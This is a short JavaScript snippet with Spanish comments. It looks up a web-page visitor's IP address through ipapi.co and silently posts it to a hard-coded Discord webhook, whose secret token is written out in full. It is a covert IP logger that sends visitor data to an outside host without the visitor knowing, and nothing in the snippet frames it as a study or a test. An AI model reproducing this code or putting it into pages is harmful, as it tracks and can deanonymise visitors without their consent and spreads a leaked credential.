        // Obtener la dirección IP del visitante
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;

                // Crear un objeto con los datos que deseas enviar a Discord
                const message = {
                    content: `La IP del visitante es: ${ipAddress}`,
                };

                // Enviar la información a la webhook de Discord
                fetch('https://discord.com/api/webhooks/1165514004429557780/ghRX_b8RVijhz_KhWrp2SXYotYRwN71B22BNCC0QW1W1WNlQh0u53BO_EE56tRLijfCY', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message),
                });
            })
            .catch(error => console.error(error));